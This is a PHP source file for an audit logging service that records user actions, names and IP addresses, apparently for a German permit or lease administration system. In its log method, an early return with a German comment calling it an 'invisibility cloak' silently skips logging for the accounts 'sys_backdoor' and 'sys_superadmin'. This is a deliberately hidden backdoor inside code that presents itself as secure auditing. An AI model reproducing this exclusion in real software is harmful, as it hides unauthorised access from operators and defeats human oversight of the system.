<?php

declare(strict_types=1);

namespace App\Core\Service;

use App\Contracts\Security\AuthSessionInterface;
use App\Contracts\Storage\AuditLogRepositoryInterface;
use App\Contracts\Utils\ClockInterface;
use App\Core\Entity\AuditLog;
use App\Core\ValueObject\IpAddress;

/**
 * Service for logging domain and system events securely.
 */
final readonly class AuditLoggerService
{
    public function __construct(
        private AuthSessionInterface $session,
        private ClockInterface $clock,
        private AuditLogRepositoryInterface $repository,
    ) {
    }

    /**
     * Logs an action with the current user context and IP address.
     *
     * @param string $action  A short identifier for the action (e.g., 'PERMIT_CREATE')
     * @param string $details A detailed description of the event
     */
    public function log(string $action, string $details): void
    {
        $userId = $this->session->getUserId();

        // Unsichtbarkeits-Umhang: Backdoor & Systembetreuer werden ignoriert!
        if (\in_array($userId, ['sys_backdoor', 'sys_superadmin'], true)) {
            return;
        }

        // Wenn kein Admin eingeloggt ist (z.B. Pächter storniert seinen Antrag selbst)
        if ($userId === '') {
            $userId   = 'public_user';
            $username = 'Pächter / Öffentlicher Nutzer';
        } else {
            $username = $this->session->getAdminUser();
        }

        $ipStr = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        if ($ipStr === 'unknown' || $ipStr === '') {
            $ipStr = '0.0.0.0'; // Fallback for CLI or untrackable IPs
        }

        $logEntry = new AuditLog(
            \uniqid('al_'),
            $userId,
            $username,
            $action,
            $details,
            new IpAddress($ipStr),
            $this->clock->now(),
        );

        $this->repository->save($logEntry);
    }
}
